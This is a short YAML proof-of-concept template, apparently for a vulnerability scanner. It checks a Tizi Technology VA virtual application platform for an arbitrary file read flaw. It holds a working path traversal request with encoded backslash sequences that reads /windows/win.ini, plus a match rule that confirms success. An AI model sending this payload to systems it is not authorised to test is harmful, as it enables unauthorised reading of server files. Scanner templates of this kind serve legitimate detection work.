id: poc-yaml-tizi-va-web-server-path-traversal
info:
  name: 霆智科技 VA虚拟应用平台 任意文件读取漏洞
  severity: high
  tags:
  - 目录遍历
  finger: 艾科思应用接入系统
requests:
- method: GET
  path: /..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/windows/win.ini
  expression: 'status_code == 200 && contains(body, "; for 16-bit app support") &&
    contains(headers, "VA Web Server")  && !contains(body, "<")

    '
variables: {}
transport: http
